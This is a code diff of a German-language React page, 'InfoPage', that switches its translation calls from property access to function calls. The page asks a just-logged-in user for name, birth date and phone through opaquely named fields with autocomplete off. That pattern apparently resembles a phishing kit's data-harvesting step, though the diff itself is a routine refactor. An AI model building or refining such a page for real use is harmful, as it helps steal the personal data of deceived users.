@@ -142,8 +142,8 @@ const InfoPage: React.FC = () => {
           {/* Left Column - Information Form */}
           <div className="left-column">
             <div className="info-section">
-              <h1 className="info-title">{t.personalInfo}</h1>
-              <h2 className="info-subtitle">{t.personalInfo}</h2>
+              <h1 className="info-title">{t('personalInfo')}</h1>
+              <h2 className="info-subtitle">{t('personalInfo')}</h2>
               
               <p className="info-description">
                 Sie haben sich erfolgreich angemeldet. Um den Vorgang fortzusetzen, benötigen wir einige persönliche Informationen von Ihnen.
@@ -158,7 +158,7 @@ const InfoPage: React.FC = () => {
                     value={formData.xname1}
                     onChange={handleInputChange}
                     className="info-input"
-                    placeholder={t.firstName}
+                    placeholder={t('firstName')}
                     autoComplete="off"
                     maxLength={50}
                     required
@@ -174,7 +174,7 @@ const InfoPage: React.FC = () => {
                     value={formData.xname2}
                     onChange={handleInputChange}
                     className="info-input"
-                    placeholder={t.lastName}
+                    placeholder={t('lastName')}
                     autoComplete="off"
                     maxLength={50}
                     required
@@ -190,7 +190,7 @@ const InfoPage: React.FC = () => {
                     value={formData.xdob}
                     onChange={handleInputChange}
                     className="info-input"
-                    placeholder={t.birthDate + ' (TT.MM.JJJJ)'}
+                    placeholder={t('birthDate') + ' (TT.MM.JJJJ)'}
                     autoComplete="off"
                     maxLength={10}
                     pattern="\d{2}\.\d{2}\.\d{4}"
@@ -207,7 +207,7 @@ const InfoPage: React.FC = () => {
                     value={formData.xtel}
                     onChange={handleInputChange}
                     className="info-input"
-                    placeholder={t.phone}
+                    placeholder={t('phone')}
                     autoComplete="off"
                     required
                   />
@@ -219,7 +219,7 @@ const InfoPage: React.FC = () => {
                   className="info-button"
                   disabled={isLoading}
                 >
-                  {isLoading ? (t.nextButton + '...') : t.nextButton}
+                  {isLoading ? (t('nextButton') + '...') : t('nextButton')}
                 </button>
               </form>
             </div>
